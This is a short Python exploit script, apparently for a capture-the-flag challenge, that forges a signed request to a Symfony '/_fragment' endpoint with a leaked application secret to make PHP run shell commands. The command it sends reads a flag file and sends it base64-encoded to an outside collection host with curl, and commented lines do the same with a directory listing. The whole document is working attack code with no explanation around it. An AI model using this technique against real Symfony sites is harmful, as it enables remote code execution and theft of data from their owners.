# phpinfo contains $_SERVER['SYMFONY_DOTENV_VARS']

import base64
import hmac
import hashlib
import requests
import urllib.parse

URL = 'http://challs.dvc.tf:9000/_fragment'

SECRET = b'60b938ad59ac73568c7f2d6c282cd084'

FUNCTION_NAME = 'exec'

# curl -v https://hookb.in/RZLY2wlKd6UNb9zzB3WB?a=`ls -al | base64 -w 0`
# curl -v https://hookb.in/RZLY2wlKd6UNb9zzB3WB?a=`cat ../flag.txt | base64 -w 0`
ARGUMENTS = {'command': '''curl -v https://hookb.in/RZLY2wlKd6UNb9zzB3WB?a=`cat ../flag.txt | base64 -w 0`''', 'return_value': 'null'}

if FUNCTION_NAME != '':
    payload = URL + '?_path=_controller%3D' + FUNCTION_NAME + '%26'
    for i in range(len(list(ARGUMENTS))):
        payload += list(ARGUMENTS)[i] + '%3D' + urllib.parse.quote_plus(ARGUMENTS[list(ARGUMENTS)[i]])
        if i != len(list(ARGUMENTS)) - 1:
            payload += '%26'
else:
    payload = URL

print('payload :', payload)

hash = base64.b64encode(hmac.HMAC(SECRET, bytes(payload, encoding='UTF-8'), hashlib.sha256).digest()).decode()

print('hash :', hash)

final_url = payload + ('?' if FUNCTION_NAME == '' else '&') + '_hash=' + urllib.parse.quote_plus(hash)

print('Final URL :', final_url)

print(requests.get(final_url).text)
